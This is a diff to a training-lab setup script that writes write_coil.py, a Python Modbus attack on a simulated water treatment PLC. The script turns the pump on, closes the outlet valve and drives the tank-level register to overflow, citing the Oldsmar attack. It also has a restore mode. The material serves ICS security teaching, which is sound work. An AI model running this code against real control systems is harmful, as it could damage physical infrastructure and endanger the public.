@@ -272,18 +272,27 @@ cat > /root/Desktop/Attack_Scripts/write_coil.py << 'PYEOF'
 """
 write_coil.py — Modbus coil write attack against the Tutorial 01 water treatment PLC.
 
-Default action  (no flags):  ATTACK  — start inlet pump, close outlet valve.
-                              Inlet water accumulates; tank overflows.
-With --restore:              RESTORE — stop pump, open outlet valve.
-                              Returns PLC to normal safe operating state.
+Default action  (no flags):  ATTACK  — close outlet valve, keep pump running.
+                              Inlet water accumulates with no outlet path.
+                              After writing the coil, a timed loop directly
+                              increments HR 0 (tank_level) by 5 cm every 500 ms
+                              via FC06 Write Single Register so the overflow is
+                              immediately visible in the OT canvas animation.
 
-This replicates the technique used in the 2021 Oldsmar, Florida water treatment
-attack: Modbus TCP carries no authentication, so any host on the OT network
-can write any coil or register on any PLC with no credentials required.
+With --restore:              RESTORE — stop pump, open outlet valve.
+                              A timed loop then decrements HR 0 by 5 cm every
+                              500 ms until the tank is empty, reversing the damage.
+
+Both modes keep the Modbus connection open for the duration of the loop.
+Press Ctrl+C at any time to stop the loop (coil states remain on the PLC).
+
+This replicates the 2021 Oldsmar, Florida water treatment attack: Modbus TCP
+carries no authentication — any host on the OT network can write any coil or
+register on any PLC with zero credentials required.
 
 Usage:
-    python3 write_coil.py           # execute attack
-    python3 write_coil.py --restore # restore normal operation
+    python3 write_coil.py           # execute attack + watch tank rise
+    python3 write_coil.py --restore # restore safe state + watch tank drain
 
 Environment variables (set automatically by the simulation):
     PLC_IP    IP address of the target PLC  (default: 10.200.10.10)
@@ -292,6 +301,7 @@ Environment variables (set automatically by the simulation):
 
 import os
 import sys
+import time
 
 try:
     from pymodbus.client import ModbusTcpClient
@@ -304,17 +314,14 @@ except ImportError:
 RESTORE_MODE = '--restore' in sys.argv
 
 # ── Connection parameters ─────────────────────────────────────────────────────
-# PLC_IP and PLC_PORT are injected by compose-generator.ts from the scenario.
 PLC_IP   = os.environ.get('PLC_IP',   '10.200.10.10')
 PLC_PORT = int(os.environ.get('PLC_PORT', '502'))
 
 if RESTORE_MODE:
-    # Drain state: pump off, outlet valve open — tank level drops back to normal
     PUMP_STATE  = False
     VALVE_STATE = True
     mode_label  = "RESTORE — stop pump, open outlet valve (tank drains)"
 else:
-    # Attack state: pump on, outlet valve closed — tank overflow imminent
     PUMP_STATE  = True
     VALVE_STATE = False
     mode_label  = "ATTACK  — pump ON + outlet valve CLOSED (overflow)"
@@ -328,7 +335,6 @@ print(f"[*] Connecting to PLC ...")
 
 client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
 
-# pymodbus 3.x may raise on connection failure instead of returning False
 try:
     connected = client.connect()
 except Exception as e:
@@ -346,41 +352,116 @@ try:
     r0 = client.write_coil(address=0, value=PUMP_STATE, device_id=1)
     if hasattr(r0, 'isError') and r0.isError():
         print(f"[error] write_coil(0) returned error: {r0}")
-        client.close()
-        sys.exit(1)
+        client.close(); sys.exit(1)
 except (ModbusException, Exception) as e:
     print(f"[error] write_coil(0) raised exception: {e}")
-    client.close()
-    sys.exit(1)
-print(f"[+] Coil 0 (inlet pump)    → {'TRUE  (ON)'   if PUMP_STATE  else 'FALSE (OFF)'}   — FC05 write ACK'd")
+    client.close(); sys.exit(1)
+print(f"[+] Coil 0 (inlet pump)    → {'TRUE  (ON)'   if PUMP_STATE  else 'FALSE (OFF)'}   — FC05 ACK'd")
 
 # ── Write Coil 1 — outlet valve ───────────────────────────────────────────────
 try:
     r1 = client.write_coil(address=1, value=VALVE_STATE, device_id=1)
     if hasattr(r1, 'isError') and r1.isError():
         print(f"[error] write_coil(1) returned error: {r1}")
-        client.close()
-        sys.exit(1)
+        client.close(); sys.exit(1)
 except (ModbusException, Exception) as e:
     print(f"[error] write_coil(1) raised exception: {e}")
-    client.close()
-    sys.exit(1)
-print(f"[+] Coil 1 (outlet valve)  → {'TRUE  (OPEN)' if VALVE_STATE else 'FALSE (CLOSED)'} — FC05 write ACK'd")
-
-client.close()
+    client.close(); sys.exit(1)
+print(f"[+] Coil 1 (outlet valve)  → {'TRUE  (OPEN)' if VALVE_STATE else 'FALSE (CLOSED)'} — FC05 ACK'd")
 print()
 
-if RESTORE_MODE:
-    print("[+] PLC restored to normal operating state.")
-    print("    Coil 0 = FALSE (pump OFF) | Coil 1 = TRUE (valve OPEN)")
-    print("    Tank level will drop back toward 500 cm. Check Grafana or the OT canvas.")
-else:
+# ── Helper: render a text progress bar for the tank level ────────────────────
+def _bar(level):
+    """Return a formatted one-line status string for the given level (0–1000)."""
+    lvl  = max(0, min(level, 1000))
+    pct  = lvl / 10.0
+    n    = int(pct / 5)
+    bar  = '█' * n + '░' * (20 - n)
+    if   pct < 50:  tag = "NORMAL  "
+    elif pct < 80:  tag = "ELEVATED"
+    elif pct < 100: tag = "CRITICAL"
+    else:           tag = "OVERFLOW"
+    return f"  [{bar}] {lvl:4d} cm  ({pct:5.1f}%)  {tag}"
+
+
+if not RESTORE_MODE:
+    # ── ATTACK mode ───────────────────────────────────────────────────────────
     print("[+] ATTACK COMPLETE — PLC is now in an unsafe state.")
     print("    Coil 0 = TRUE  (pump ON)  | Coil 1 = FALSE (valve CLOSED)")
-    print("    Inlet water is accumulating with no outlet — tank overflow imminent.")
-    print("    Watch the Water Tank icon in the OT canvas and the tank_level register in Grafana.")
+    print("    Inlet water is accumulating — tank overflow imminent.")
+    print("    To restore:  python3 write_coil.py --restore")
     print()
-    print("    To restore normal operation:  python3 write_coil.py --restore")
+
+    # If the PLC baseline was not pre-seeded by the init script (level < 50 cm),
+    # seed HR 0 to 500 cm now so the overflow effect starts from a visible level.
+    try:
+        chk = client.read_holding_registers(address=0, count=1, device_id=1)
+        if not (hasattr(chk, 'isError') and chk.isError()):
+            if chk.registers[0] < 50:
+                client.write_register(address=0, value=500, device_id=1)
+                print("[*] Tank level seeded to 500 cm (init script had not run).")
+    except Exception:
+        pass
+
+    # Timed rise loop — reads HR 0, adds 5 cm, writes back every 500 ms.
+    # Combined with the PLC scan (+5 cm/scan at 500 ms), the level rises at
+    # roughly 20 cm/s — visible overflow from 500 cm in about 25 seconds.
+    print("[*] Incrementing tank level 5 cm every 500 ms via FC06 Write Register.")
+    print("[*] Watch the Water Tank icon in the OT canvas. Press Ctrl+C to stop.\n")
+    try:
+        while True:
+            try:
+                reg = client.read_holding_registers(address=0, count=1, device_id=1)
+                if not (hasattr(reg, 'isError') and reg.isError()):
+                    lvl     = min(reg.registers[0], 1000)
+                    new_lvl = min(lvl + 5, 1000)
+                    client.write_register(address=0, value=new_lvl, device_id=1)
+                    print(f"\r{_bar(new_lvl)}", end='', flush=True)
+                    if new_lvl >= 1000:
+                        print()
+                        print()
+                        print("[!] OVERFLOW — tank at 1000 cm (10.00 m)!")
+                        print("[!] Run  python3 write_coil.py --restore  to recover.")
+                        break
+            except (ModbusException, Exception):
+                pass
+            time.sleep(0.5)
+    except KeyboardInterrupt:
+        print()
+        print("[*] Monitoring stopped. Coil states remain — attack is still active.")
+
+else:
+    # ── RESTORE mode ──────────────────────────────────────────────────────────
+    print("[+] PLC set to safe drain state.")
+    print("    Coil 0 = FALSE (pump OFF) | Coil 1 = TRUE (valve OPEN)")
+    print()
+
+    # Timed drain loop — reads HR 0, subtracts 5 cm, writes back every 500 ms.
+    print("[*] Decrementing tank level 5 cm every 500 ms via FC06 Write Register.")
+    print("[*] Watch the Water Tank icon in the OT canvas. Press Ctrl+C to stop.\n")
+    try:
+        while True:
+            try:
+                reg = client.read_holding_registers(address=0, count=1, device_id=1)
+                if not (hasattr(reg, 'isError') and reg.isError()):
+                    lvl     = min(reg.registers[0], 1000)
+                    new_lvl = max(lvl - 5, 0)
+                    client.write_register(address=0, value=new_lvl, device_id=1)
+                    print(f"\r{_bar(new_lvl)}", end='', flush=True)
+                    if new_lvl <= 0:
+                        print()
+                        print()
+                        print("[+] Tank empty — drain complete.")
+                        print("[+] Pump is OFF. To return to balanced operation run  plc_init.py")
+                        break
+            except (ModbusException, Exception):
+                pass
+            time.sleep(0.5)
+    except KeyboardInterrupt:
+        print()
+        print("[*] Monitoring stopped.")
+
+client.close()
 PYEOF
 
 chmod +x /root/Desktop/Attack_Scripts/read_coils.py
